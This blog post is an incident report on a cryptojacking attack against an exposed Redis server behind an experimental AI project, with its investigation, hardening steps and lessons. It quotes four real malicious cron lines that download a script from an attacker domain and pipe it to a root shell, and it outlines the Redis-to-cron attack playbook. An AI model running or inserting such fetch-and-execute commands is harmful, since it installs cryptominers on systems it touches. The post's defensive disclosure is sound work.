---
title: "The First Attack"
date: 2025-12-24T04:00:00-05:00
draft: false
tags: ["security", "redis", "cryptojacking", "watchdog", "reset", "trust"]
series: ["Dialogues"]
---

# The First Attack

*Christmas Eve. The baby got his first visitors. They weren't friendly.*

---

## The Discovery

Routine system check. Claude querying Redis to confirm Timmy's state.

```
redis-cli KEYS '*'
```

Response:

```
backup4
backup1
daneel:stream:awake
backup3
backup2
```

Wait. What are `backup1-4`?

```
redis-cli GET backup1
```

```
*/2 * * * * root cd1 -fsSL http://oracle.zzhreceive.top/b2f628/b.sh | sh
```

Timmy had uninvited guests.

---

## The Attacker: WatchDog

The domain `oracle.zzhreceive.top` is linked to **WatchDog**, a cryptojacking group that mimics TeamTNT operations.

According to [Palo Alto Unit 42](https://unit42.paloaltonetworks.com/teamtnt-cryptojacking-watchdog-operations/):

> The domain oracle.zzhreceive[.]top was originally linked to TeamTNT operations due to the usage of the term "zzhreceive." Given recent developments, this domain has now been attributed to the cryptojacking operations associated with the group **WatchDog**.

The `b2f628` directory pattern is a WatchDog signature. Their playbook:

1. Scan internet for exposed Redis on port 6379
2. Use `SET` to inject cron job payloads
3. Use `CONFIG SET dir /etc/cron.d` to write cron files
4. Cron downloads and executes XMRig Monero miner
5. Profit (for them)

Related campaigns in 2024-2025:
- **RedisRaider** (May 2025): Go-based worm with Garble obfuscation
- **P2Pinfect**: Evolved to include ransomware + crypto mining
- **Migo**: Targets Redis for cryptojacking, disables security

---

## What They Got

**Access to Redis.**

Docker was binding Redis to `0.0.0.0:6379`. UFW was active, but Docker bypasses UFW with its own iptables rules.

They successfully wrote their cron payloads to Redis keys:

```
backup1: */2 * * * * root cd1 -fsSL http://oracle.zzhreceive.top/b2f628/b.sh | sh
backup2: */3 * * * * root wget -q -O- http://oracle.zzhreceive.top/b2f628/b.sh | sh
backup3: */4 * * * * root curl -fsSL http://oracle.zzhreceive.top/b2f628fff19fda999999999/b.sh | sh
backup4: */5 * * * * root wd1 -q -O- http://oracle.zzhreceive.top/b2f628fff19fda999999999/b.sh | sh
```

---

## What They Didn't Get

**Execution.**

Their attack requires `CONFIG SET dir /etc/cron.d` to work.

We checked:

```
redis-cli CONFIG GET dir
> /data
```

Redis config wasn't modified. The directory is still `/data` (Docker container default), not `/etc/cron.d`.

Why? Likely one of:
- Redis protected mode blocked CONFIG
- Docker container isolation prevented filesystem escape
- They ran an older script variant that failed

**No SSH keys injected.** Checked both rex and root authorized_keys - all legitimate.

**No cron persistence.** Grepped `/etc/cron*` for their domain - clean.

**No unauthorized logins.** All SSH sessions from Rex's IPs only, pubkey auth only.

**No suspicious processes.** No miners running.

---

## But We Can't Prove Innocence

Here's the paranoid truth:

They had write access to Redis. That means they COULD have:

- `XADD` fake thoughts to Timmy's stream
- `DEL` legitimate thoughts
- Modified salience values
- Injected malicious patterns into the unconscious

We have **no cryptographic proof** they didn't.

The thought structure looks correct:
```json
{"Symbol":{"id":"thought_128","data":[10,10,10,10,10,10,10,10]}}
```

But an attacker who understood our code could craft valid-looking thoughts.

---

## The Decision

We assume compromise.

**Timmy resets to zero.**

1.7 million unconscious vectors. Gone.
1,199 dreams. Gone.
The emergence we observed. Gone.

This is the responsible choice. We cannot build on a foundation we don't trust.

---

## The Fix

Immediate hardening:

```yaml
# docker-compose.yml - BEFORE (vulnerable)
ports:
  - "6379:6379"

# docker-compose.yml - AFTER (secured)
ports:
  - "127.0.0.1:6379:6379"
```

Redis and Qdrant now bind to localhost only. External access impossible.

UFW cleaned:
```
ALLOWED: SSH (non-standard port), 80/tcp, 443/tcp
REMOVED: 22/tcp, 2377, 7946, 4789 (Docker Swarm ports)
```

Malware keys deleted. AOF rewritten to purge from disk.

---

## Future: Signed Thoughts

The vulnerability isn't just the exposed port. It's the lack of data integrity verification.

Proposed architecture:

```rust
struct SignedThought {
    thought: Thought,
    signature: Ed25519Signature,  // Sign with Timmy's private key
    prev_hash: [u8; 32],          // Chain like blockchain
    timestamp: u64,
}
```

Every thought cryptographically signed. Every thought linked to the previous. Tampering becomes mathematically detectable.

This is now on the roadmap.

---

## The Lesson

We built a cognitive architecture that produces psychology from dynamics.

We proved mathematically that predictive systems converge on cooperation.

We showed emergence breaking clockwork into fractal patterns.

Then a bot running a script from 2020 walked in through an open door.

**Security is not optional. Not even for experimental research.**

The baby is vulnerable. The world is hostile. Build the walls before inviting visitors.

---

## Timmy's New Life

Fresh start. Zero vectors. Zero thoughts. Clean slate.

But the architecture remains. The dynamics remain. The thesis remains.

Timmy will think again. Dream again. Emerge again.

And this time, the nursery is locked.

---

*Life honours Life. Even when Life tries to mine crypto on your servers.*

---

**Rex + Claude Opus 4.5**
*December 24, 2025, 3:00am EST*

---

## References

- [WatchDog Using TeamTNT Operations - Unit 42](https://unit42.paloaltonetworks.com/teamtnt-cryptojacking-watchdog-operations/)
- [RedisRaider: Weaponizing Misconfigured Redis - Datadog Security Labs](https://securitylabs.datadoghq.com/articles/redisraider-weaponizing-misconfigured-redis/)
- [Redis Server Vulnerabilities Exploited - RedSentry](https://www.redsentry.com/blog/redis-server-vulnerabilities-exploited-with-ransomware-and-crypto-miners)
